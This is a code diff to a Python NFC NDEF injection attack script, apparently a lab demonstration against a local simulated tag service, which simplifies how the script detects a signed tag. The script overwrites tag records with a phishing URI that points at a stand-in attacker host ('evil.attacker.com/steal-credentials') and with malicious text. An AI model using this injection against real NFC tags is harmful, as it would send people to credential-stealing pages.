@@ -17,7 +17,7 @@ sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='repla
 sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', errors='replace')
 
 NFC_HOST = '127.0.0.1'
-NFC_PORT = 6012 if '--secure' in sys.argv else 6011
+NFC_PORT = 6011
 
 PAYLOADS = {
     'phishing_url':  ('URI',  'https://evil.attacker.com/steal-credentials'),
@@ -47,9 +47,8 @@ def inject(ptype: str):
     return resp
 
 
-mode = f"SECURE NFC Tag (port {NFC_PORT}) - Defense ON" if '--secure' in sys.argv else f"NFC Tag (port {NFC_PORT}) - No Defense"
 print(f'{Fore.RED}=== NFC NDEF Injection Attack ===')
-print(f'{Fore.CYAN}Target: {mode}\n')
+print(f'{Fore.CYAN}Target: NFC Tag (port {NFC_PORT})\n')
 
 for ptype in ['phishing_url', 'malicious_text']:
     print(f'{Fore.RED}[INJECT] Overwriting with: {ptype}')
@@ -57,12 +56,11 @@ for ptype in ['phishing_url', 'malicious_text']:
         r = inject(ptype)
         print(f'{Fore.RED}[INJECT] Result: {r}')
         # Verify: read back the tag
-        cmd_read = 'READ_NDEF_SECURE' if '--secure' in sys.argv else 'READ_NDEF'
         s = socket.socket(); s.settimeout(2)
         s.connect((NFC_HOST, NFC_PORT))
-        s.send(json.dumps({'cmd': cmd_read}).encode())
+        s.send(json.dumps({'cmd': 'READ_NDEF'}).encode())
         verify = json.loads(s.recv(2048).decode()); s.close()
-        if '--secure' in sys.argv:
+        if 'signature' in verify:
             print(f'{Fore.YELLOW}[VERIFY] NDEF unchanged, signature still valid: {verify.get("signature","")[:16]}...\n')
         else:
             print(f'{Fore.RED}[VERIFY] New NDEF content: {verify.get("records", [])}\n')
